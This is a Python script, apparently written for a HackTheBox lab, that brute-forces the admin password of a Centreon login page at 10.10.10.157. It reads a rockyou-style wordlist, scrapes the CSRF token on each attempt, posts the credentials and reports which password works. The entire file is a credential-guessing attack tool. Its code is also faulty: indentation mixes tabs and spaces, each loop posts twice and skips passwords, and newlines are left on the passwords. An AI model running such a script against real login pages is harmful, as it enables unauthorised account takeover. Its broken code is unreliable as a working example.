import requests
from bs4 import BeautifulSoup as bs
import sys
from colorama import Fore
import argparse
passwords = open("/home/rbus/Desktop/HackTheBox/mango/myrockyou.txt","r")
url = "http://10.10.10.157/centreon/index.php"
password = passwords.readline()
while password:
	try:
		session = requests.session()
		page = session.get(url)
       		html_parser = page.text
        	soup = bs(html_parser, "html.parser")
        	token = soup.findAll('input')[3].get("value")

        	login_info = {
                	"useralias": "admin",
	                "password": password,
        	        "submitLogin": "Connect",
                	"centreon_token": token
		        }
		login_request = session.post(url, login_info)
		response_text = login_request.text
		password = passwords.readline()

        	login_request = session.post(url, login_info)
        	response_text = login_request.text
        	password = passwords.readline()
        	if "Your credentials are incorrect." in response_text or "Forbidden" in response_text:
            		print (Fore.RED + "password: " + str(login_info["password"]))
        	else:
            		print (Fore.GREEN + "PASSWORD HAS BEEN FOUND USE: " + str(login_info["password"]))
            	sys.exit()
	except:
        	print("something went wrong")
